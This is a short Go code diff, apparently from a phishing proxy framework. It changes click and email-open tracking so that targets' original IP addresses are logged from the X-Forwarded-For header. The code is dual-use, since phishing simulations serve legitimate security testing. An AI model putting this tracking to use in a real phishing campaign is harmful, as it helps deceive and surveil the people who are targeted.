@@ -179,14 +179,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             //log.Debug("Rid regex", ridr.FindString(req_url))
             if len(rid_match) != 0 && len(opened_match) == 0 {
                 rid = strings.Split(rid_match, "=")[1]
-                browser = map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
+                browser = map[string]string{"address": req.RemoteAddr, "orig-address": req.Header.Get("X-Forwarded-For"), "user-agent": req.UserAgent()}
                 err := database.HandleClickedLink(rid, browser, p.livefeed)
                 if err != nil {
                     log.Error("failed to add clicked link event to database: %s", err)
                 }
             } else if len(rid_match) != 0 && len(opened_match) != 0 {
                 rid = strings.Split(rid_match, "=")[1]
-                browser = map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
+                browser = map[string]string{"address": req.RemoteAddr, "orig-address": req.Header.Get("X-Forwarded-For"), "user-agent": req.UserAgent()}
                 err := database.HandleEmailOpened(rid, browser, p.livefeed)
                 if err != nil {
                     log.Error("failed to add email opened event to database: %s", err)
